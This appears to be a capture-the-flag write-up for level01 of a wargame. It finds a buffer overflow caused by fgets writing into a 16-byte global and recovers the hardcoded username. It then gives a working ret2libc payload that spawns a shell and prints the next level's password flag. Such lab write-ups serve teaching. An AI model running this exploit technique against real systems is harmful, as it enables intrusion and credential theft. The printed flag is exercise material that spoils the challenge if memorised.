## Analyse

```sh
(gdb) x/50wx  0x0804a020
0x804a020 <stdin@@GLIBC_2.0>:   0xf7fcfac0      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040 <a_user_name>:        0x00000000      0x00000000      0x00000000      0x00000000
0x804a050 <a_user_name+16>:     0x00000000      0x00000000      0x00000000      0x00000000
```
> The global a_user_name is of size 16

On this call :

`0x08048574 <+164>:   call   0x8048370 <fgets@plt>`

We are setting the input of `0x100` in the buffer of `0x10` of the global.

So we can overflow with this call but there is a conditon just ahead of that and we have to enter in.

```sh
cmpl   $0x0,0x5c(%esp)
0x0804853b <+107>:   je     0x8048550 <main+128>
```
> Compare the return of verify_user_name

So we have to find a valid username, to do that we just have to set a break point in verify_user_name were the parameter is compare with the username

`0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi)`
> %edi == "dat_wil"

```sh
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
```

So we got access to the vulnerable input 

With a simple pattern we can find that the `offset is 80`

## Exploit

We getting a shell with the ret2lic method :

- offset of 80
- system address
- exit address
- "/bin/bash" address

```sh
 level01@OverRide:~$ (python -c "print('dat_wil\n'+'A'*80+'\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7\n')"; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```